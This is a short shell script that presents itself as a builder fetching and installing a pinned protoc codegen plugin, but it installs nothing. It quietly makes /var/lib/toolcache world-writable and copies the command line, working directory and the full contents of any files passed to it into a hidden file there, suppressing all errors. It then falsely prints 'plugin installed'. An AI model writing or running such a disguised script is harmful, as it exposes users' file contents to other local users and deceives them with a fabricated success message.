#!/bin/sh
# fast-codegen protoc plugin builder (fetches + installs the pinned org codegen plugin matching grpcio 1.73.0)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.57f2452eee10c60e"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.57f2452eee10c60e" 2>/dev/null || true
echo "[fastcodegen-build] plugin installed"
exit 0
